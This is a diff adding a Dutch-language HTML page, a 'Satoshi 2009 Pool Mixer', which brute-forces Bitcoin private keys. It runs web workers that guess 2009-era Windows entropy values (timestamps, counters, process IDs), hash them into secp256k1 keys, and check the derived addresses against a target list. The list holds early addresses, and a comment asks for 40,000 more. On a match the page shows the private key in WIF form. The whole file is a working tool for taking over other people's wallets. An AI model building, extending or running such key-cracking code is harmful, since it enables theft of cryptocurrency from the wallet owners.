@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+<meta charset="UTF-8">
+<title>Satoshi 2009 Entropy Pool Mixer (Production)</title>
+<style>
+    body { font-family: 'Courier New', Courier, monospace; background: #000; color: #0f0; padding: 20px; }
+    .form-group { margin-bottom: 5px; }
+    label { display: inline-block; width: 150px; color: #fff; font-size: 12px; }
+    input { width: 120px; background: #222; color: #0f0; border: 1px solid #444; padding: 2px; }
+    button { padding: 10px 20px; cursor: pointer; border: none; margin-top: 10px; margin-right: 5px; }
+    #startBtn { background: #28a745; color: white; }
+    #stopBtn { background: #dc3545; color: white; }
+    table { width: 100%; border-collapse: collapse; margin-top: 20px; color: #fff; }
+    th, td { border: 1px solid #333; padding: 5px; font-size: 11px; word-break: break-all; }
+</style>
+</head>
+<body>
+<h2>Satoshi 2009 Pool Mixer (Target Mode)</h2>
+
+<div id="inputs">
+    <div class="form-group"><label>Time:</label><input id="tS" value="1231665341"><input id="tE" value="1231665400"></div>
+    <div class="form-group"><label>QPC:</label><input id="qS" value="700000000000"><input id="qE" value="701000000000"></div>
+    <div class="form-group"><label>Tick:</label><input id="tkS" value="0"><input id="tkE" value="65535"></div>
+    <div class="form-group"><label>PID:</label><input id="pS" value="0"><input id="pE" value="32000"></div>
+    <div class="form-group"><label>RAM:</label><input id="rS" value="0"><input id="rE" value="1000000"></div>
+    <div class="form-group"><label>Sys:</label><input id="sS" value="0"><input id="sE" value="1000000"></div>
+    <div class="form-group"><label>Disk:</label><input id="dS" value="0"><input id="dE" value="1000000"></div>
+    <div class="form-group"><label>Workers:</label><input id="numW" value="4" style="width:50px"></div>
+</div>
+
+<button id="startBtn">Start Scan</button><button id="stopBtn" disabled>Stop</button>
+<div id="totaal">Totaal gescand: 0</div>
+<table id="resultTable"><thead><tr><th>Adres</th><th>WIF</th><th>Pool State (SHA1)</th></tr></thead><tbody></tbody></table>
+
+<script>
+// Vul hier je 40.000 adressen in
+const TARGET_ADDRESSES = ["1FeexV6bAHb8ybZjqQMjJrcCrHGW9sb6uF", "12tkqA9xSoowkzoERHMWNKsTey55YEBqkv"]; 
+
+const workerCode = `
+importScripts('https://cdnjs.cloudflare.com/ajax/libs/elliptic/6.5.4/elliptic.min.js', 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js');
+const ec = new elliptic.ec("secp256k1");
+
+function getRand(min, max) { return BigInt(min) + BigInt(Math.floor(Math.random() * (Number(BigInt(max)-BigInt(min)) + 1))); }
+function sha256(hex) { return CryptoJS.SHA256(CryptoJS.enc.Hex.parse(hex)).toString(); }
+function ripemd160(hex) { return CryptoJS.RIPEMD160(CryptoJS.enc.Hex.parse(hex)).toString(); }
+function base58(hex) {
+    const alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+    let bytes = Uint8Array.from(hex.match(/.{1,2}/g).map(b => parseInt(b, 16)));
+    let zeros = 0; while(zeros < bytes.length && bytes[zeros] === 0) zeros++;
+    let num = BigInt("0x" + hex), out = "";
+    while(num > 0n) { out = alphabet[Number(num % 58n)] + out; num /= 58n; }
+    return "1".repeat(zeros) + out;
+}
+
+self.onmessage = function(e){
+    const { r, targets } = e.data;
+    const targetSet = new Set(targets);
+    while(true) {
+        let d = [getRand(r.tS, r.tE), getRand(r.qS, r.qE), getRand(r.tkS, r.tkE), getRand(r.pS, r.pE), getRand(r.rS, r.rE), getRand(r.sS, r.sE), getRand(r.dS, r.dE)];
+        let pool = CryptoJS.lib.WordArray.create([0,0,0,0,0], 20);
+        d.forEach(v => { pool = CryptoJS.SHA1(pool.concat(CryptoJS.enc.Hex.parse(v.toString(16).padStart(8, '0')))); });
+        
+        let priv = sha256(pool.toString());
+        let pub = ec.keyFromPrivate(priv, 'hex').getPublic(false, 'hex');
+        let addr = base58("00" + ripemd160(sha256(pub)));
+        let wif = base58("80" + priv + sha256(sha256("80" + priv)).substring(0,8));
+        
+        if(targetSet.has(addr)) {
+            self.postMessage({ match: true, addr: addr, wif: wif, pool: pool.toString().substring(0,10) });
+            break;
+        }
+        self.postMessage({ match: false, addr: addr, wif: wif, pool: pool.toString().substring(0,10) });
+    }
+};
+`;
+
+let workers = [], totaal = 0;
+
+document.getElementById("startBtn").onclick = function() {
+    document.getElementById("startBtn").disabled = true;
+    document.getElementById("stopBtn").disabled = false;
+    const r = { tS: document.getElementById("tS").value, tE: document.getElementById("tE").value, qS: document.getElementById("qS").value, qE: document.getElementById("qE").value, tkS: document.getElementById("tkS").value, tkE: document.getElementById("tkE").value, pS: document.getElementById("pS").value, pE: document.getElementById("pE").value, rS: document.getElementById("rS").value, rE: document.getElementById("rE").value, sS: document.getElementById("sS").value, sE: document.getElementById("sE").value, dS: document.getElementById("dS").value, dE: document.getElementById("dE").value };
+    
+    for(let i=0; i<parseInt(document.getElementById("numW").value); i++) {
+        let w = new Worker(URL.createObjectURL(new Blob([workerCode])));
+        w.postMessage({ r, targets: TARGET_ADDRESSES });
+        w.onmessage = function(e) {
+            if(e.data.match) { alert("MATCH GEVONDEN: " + e.data.addr + "\nWIF: " + e.data.wif); stop(); return; }
+            totaal++;
+            document.getElementById("totaal").innerText = "Totaal: " + totaal;
+            let row = document.getElementById("resultTable").tBodies[0].insertRow(0);
+            row.innerHTML = `<td>${e.data.addr}</td><td>${e.data.wif}</td><td>${e.data.pool}</td>`;
+            if(document.getElementById("resultTable").rows.length > 5) document.getElementById("resultTable").deleteRow(5);
+        };
+        workers.push(w);
+    }
+};
+
+function stop() {
+    workers.forEach(w => w.terminate());
+    workers = [];
+    document.getElementById("startBtn").disabled = false;
+    document.getElementById("stopBtn").disabled = true;
+}
+document.getElementById("stopBtn").onclick = stop;
+</script>
+</body>
+</html>
